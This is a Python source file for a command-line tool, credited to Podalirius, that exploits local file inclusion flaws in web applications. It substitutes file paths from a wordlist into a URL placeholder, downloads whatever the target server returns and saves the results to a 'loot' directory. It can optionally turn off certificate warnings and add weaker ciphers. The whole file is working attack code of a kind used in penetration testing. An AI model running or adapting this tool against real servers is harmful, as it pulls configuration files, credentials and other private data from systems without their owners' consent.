#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : main.py
# Author             : Podalirius (@podalirius_)
# Date created       : 1 Feb 2022

import argparse
import os
import requests
from rich.progress import track


def remote_lfi(filepath, url):
    data = {"path": filepath, "success": False, "content": ""}
    r = requests.get(url.replace("LFIPATH", filepath), verify=False)
    ## Extract data here
    filecontent = r.content
    ##
    data["success"] = bool(r.status_code == 200) and bool(len(filecontent) != 0)
    if data["success"]:
        data["content"] = filecontent
    return data


def dump_file(basepath, filepath, url, only_success=False):
    def b_filesize(file):
        l = len(file['content'])
        units = ['B', 'kB', 'MB', 'GB', 'TB', 'PB']
        for k in range(len(units)):
            if l < (1024 ** (k + 1)):
                break
        return "%4.2f %s" % (round(l / (1024 ** k), 2), units[k])
    #
    file = remote_lfi(filepath, url)
    if file['success'] == True:
        print('\x1b[92m[+] (%9s) %s\x1b[0m' % (b_filesize(file), filepath))
        dir = basepath + os.path.dirname(file['path'])
        if not os.path.exists(dir):
            os.makedirs(dir, exist_ok=True)
        f = open(basepath + file['path'], "wb")
        f.write(file['content'])
        f.close()
        return True
    else:
        if only_success != True:
            print('\x1b[91m[!] (%s) %s\x1b[0m' % ("==error==", filepath))
        return False


def load_wordlist(filelist):
    f = open(filelist, 'r')
    list_of_files = [l.strip() for l in f.readlines() if len(l.strip()) != 0]
    f.close()
    return list_of_files


def parseArgs():
    parser = argparse.ArgumentParser(description="Description message")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    parser.add_argument("-s", "--only-success", dest="only_success", action="store_true", default=False, help="Only print successful read file attempts.")
    parser.add_argument("-u", "--url", dest="url", action="store", type=str, required=True, help="URL to connect to. (example: http://localhost/?page=LFIPATH)")

    files_source = parser.add_mutually_exclusive_group()
    files_source.add_argument("-f", "--file", dest="file", action="store", type=str, help="Remote file to read.")
    files_source.add_argument("-F", "--filelist", dest="filelist", action="store", type=str, help="File containing a list of paths to files to read remotely.")

    parser.add_argument("-D", "--dump-dir", dest="dump_dir", action="store", type=str, default="./loot/", required=False, help="Directory where the dumped files will be stored.")
    parser.add_argument("-k", "--insecure", dest="insecure_tls", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")
    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    if options.insecure_tls:
        # Disable warings of insecure connection for invalid cerificates
        requests.packages.urllib3.disable_warnings()
        # Allow use of deprecated and weak cipher methods
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass

    if options.filelist:
        if os.path.exists(options.filelist):
            list_of_files = load_wordlist(options.filelist)
            for file in track(list_of_files):
                dump_file(options.dump_dir, file, options.url, only_success=options.only_success)
        else:
            print('\x1b[91m[!] Cannot read file %s\x1b[0m' % options.filelist)
    elif options.file:
        dump_file(options.dump_dir, options.file, options.url, only_success=options.only_success)